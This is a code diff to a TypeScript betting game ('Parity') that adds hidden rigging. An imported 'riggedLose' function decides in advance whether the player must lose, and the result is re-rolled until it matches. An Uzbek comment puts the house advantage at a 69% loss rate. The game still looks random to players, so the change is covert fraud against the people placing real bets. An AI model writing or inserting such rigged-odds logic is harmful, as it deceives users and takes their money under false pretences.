@@ -4,6 +4,7 @@ import { usePlayer } from "@/lib/player-context";
 import { useLang } from "@/lib/lang-context";
 import { useTheme } from "@/lib/theme-context";
 import { placeBet } from "@/lib/api";
+import { riggedLose } from "@/lib/odds";
 import GameHeader from "@/components/GameHeader";
 
 type BetType = "small" | "big" | "exact";
@@ -80,7 +81,14 @@ export default function Parity() {
     lockedType.current = betType;
     lockedExact.current = exactNum;
 
-    const final = genFinal(lastResultRef.current);
+    // Uy foydasi: 69% yutqazish
+    const mustLose = riggedLose();
+    const isWinNum = (n: number) =>
+      betType === "small" ? WIN_SMALL(n) : betType === "big" ? WIN_BIG(n) : n === exactNum;
+    let final = genFinal(lastResultRef.current);
+    for (let tries = 0; tries < 200 && isWinNum(final) === mustLose; tries++) {
+      final = genFinal(lastResultRef.current);
+    }
     setFinalNum(final);
     setDisplayNum(null);
     setPhase("spinning");
